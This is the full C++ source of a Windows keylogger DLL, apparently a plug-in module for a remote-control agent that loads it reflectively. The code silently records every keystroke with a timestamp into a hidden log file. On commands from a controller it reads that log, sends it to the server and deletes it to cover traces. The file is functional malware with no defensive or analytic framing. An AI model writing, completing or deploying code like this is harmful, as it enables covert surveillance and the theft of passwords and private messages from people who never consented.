// Modules/Keylogger/keylogger.cpp — SILENT LOGGING + ON-DEMAND EXFILTRATION
// Компиляция: cl /LD /MT /O2 keylogger.cpp /Fe:keylogger.dll user32.lib kernel32.lib
#include <windows.h>
#include <stdio.h>
#include <string.h>

struct ModuleAPI {
    void (*send_result)(const unsigned char* data, unsigned long long len);
    void (*log)(const char* msg);
    const char* (*get_command)(const char* key);
};

static volatile bool g_running = true;
static CRITICAL_SECTION g_cs;
static bool g_key_state[256] = {false};

// API Pointers
static void (*g_send_result)(const unsigned char*, unsigned long long) = nullptr;
static const char* (*g_get_command)(const char*) = nullptr;

const char* LOG_FILE = "C:\\temp\\kl.log";

// --- Helper: Append text to log file silently ---
void AppendToFile(const char* text) {
    if (!text) return;
    // Ensure directory exists
    CreateDirectoryA("C:\\temp", NULL);
    
    // Open for writing (append), sharing read access
    HANDLE hFile = CreateFileA(LOG_FILE, 
                               GENERIC_WRITE, 
                               FILE_SHARE_READ, 
                               NULL, 
                               OPEN_ALWAYS, 
                               FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN, 
                               NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        // Move to end of file
        SetFilePointer(hFile, 0, NULL, FILE_END);
        DWORD written;
        WriteFile(hFile, text, (DWORD)strlen(text), &written, NULL);
        CloseHandle(hFile);
    }
}

// --- Helper: Exfiltrate (Read -> Send -> Delete) ---
void ExfiltrateLog() {
    // 1. Open file for reading
    HANDLE hFile = CreateFileA(LOG_FILE, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return; // File not found
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == 0 || fileSize == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        // If empty, just delete to clean up
        DeleteFileA(LOG_FILE);
        return;
    }

    // Allocate memory: File Size + Header Buffer
    char* buffer = (char*)HeapAlloc(GetProcessHeap(), 0, fileSize + 256);
    if (!buffer) {
        CloseHandle(hFile);
        return;
    }

    // Add header
    int header_len = sprintf_s(buffer, 256, "[KEYLOG FILE DUMP]\n--- Content of %s (%lu bytes) ---\n", LOG_FILE, fileSize);
    
    DWORD bytesRead = 0;
    // 2. Read content
    if (ReadFile(hFile, buffer + header_len, fileSize, &bytesRead, NULL)) {
        CloseHandle(hFile); // Close before deleting
        
        // 3. Send to Server
        unsigned long long total_len = header_len + bytesRead;
        // Null terminate for safety
        buffer[total_len] = '\0'; 
        
        g_send_result((const unsigned char*)buffer, total_len);
        
        // 4. Delete Original File
        DeleteFileA(LOG_FILE);
    } else {
        CloseHandle(hFile);
    }

    HeapFree(GetProcessHeap(), 0, buffer);
}

DWORD WINAPI KeyloggerWorker(LPVOID) {
    if (!g_send_result) return 1;
    
    InitializeCriticalSection(&g_cs);
    memset(g_key_state, 0, sizeof(g_key_state));

    while (g_running) {
        Sleep(20); // Check every 20ms

        // 1. Check for Key Presses
        for (int vk = 8; vk < 255; vk++) {
            if (GetAsyncKeyState(vk) & 0x8000) {
                if (!g_key_state[vk]) {
                    g_key_state[vk] = true;
                    
                    char keyName[64] = {0};
                    // Simple Key Mapping
                    if (vk >= 'A' && vk <= 'Z') keyName[0] = (char)vk; 
                    else if (vk >= '0' && vk <= '9') keyName[0] = (char)vk;
                    else if (vk == VK_SPACE) strcpy(keyName, " ");
                    else if (vk == VK_RETURN) strcpy(keyName, "\n"); // Enter
                    else if (vk == VK_BACK) strcpy(keyName, "[BACK]");
                    else if (vk == VK_TAB) strcpy(keyName, "[TAB]");
                    else if (vk >= VK_F1 && vk <= VK_F24) sprintf(keyName, "[F%d]", vk - VK_F1 + 1);
                    else sprintf(keyName, "[%d]", vk);

                    // Format: [HH:MM:SS] Key
                    SYSTEMTIME st; GetLocalTime(&st);
                    char logLine[128];
                    sprintf_s(logLine, "[%02d:%02d:%02d] %s", st.wHour, st.wMinute, st.wSecond, keyName);
                    
                    // --- SILENT WRITE ---
                    // We DO NOT send to console here. We only write to disk.
                    EnterCriticalSection(&g_cs);
                    AppendToFile(logLine);
                    LeaveCriticalSection(&g_cs);
                }
            } else {
                if (g_key_state[vk]) {
                    g_key_state[vk] = false;
                }
            }
        }

        // 2. Check for Commands
        if (g_get_command) {
            const char* cmd = g_get_command("keylogger");
            if (cmd && strlen(cmd) > 0) {
                // Commands to trigger exfiltration
                if (strstr(cmd, "dump") || strstr(cmd, "send") || strstr(cmd, "download") || strstr(cmd, "get")) {
                    // TRIGGER: Read File -> Send -> Delete
                    ExfiltrateLog();
                }
                // Command to stop keylogger
                else if (strstr(cmd, "stop")) {
                    g_running = false;
                }
            }
        }
    }

    DeleteCriticalSection(&g_cs);
    return 0;
}

//точка входа модуля, вызываемая агентом после рефлективной загрузки
extern "C" __declspec(dllexport) int __stdcall Run(ModuleAPI* api) {
    if (!api || !api->send_result) return -1;
    g_send_result = api->send_result;
    g_get_command = api->get_command;
    
    CreateThread(NULL, 0, KeyloggerWorker, NULL, 0, NULL);
    return 0;
}

// вызывается при загрузке ивыгрузке длл
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}